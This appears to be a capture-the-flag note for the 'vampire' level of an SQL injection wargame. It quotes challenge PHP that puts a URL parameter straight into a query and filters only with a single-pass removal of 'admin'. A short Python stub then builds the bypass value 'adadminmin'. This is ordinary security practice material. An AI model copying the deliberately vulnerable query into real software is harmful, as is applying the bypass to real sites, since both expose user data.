'''
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  $_GET[id] = strtolower($_GET[id]);
  $_GET[id] = str_replace("admin","",$_GET[id]); 
  $query = "select id from prob_vampire where id='{$_GET[id]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("vampire"); 
  highlight_file(__FILE__); 
?>
'''
import requests
from urllib import parse

# single quote 사용 불가, admin 키워드 사용 불가

host = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id="
cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}
s = requests.Session()

param = "adadminmin" # replace 우회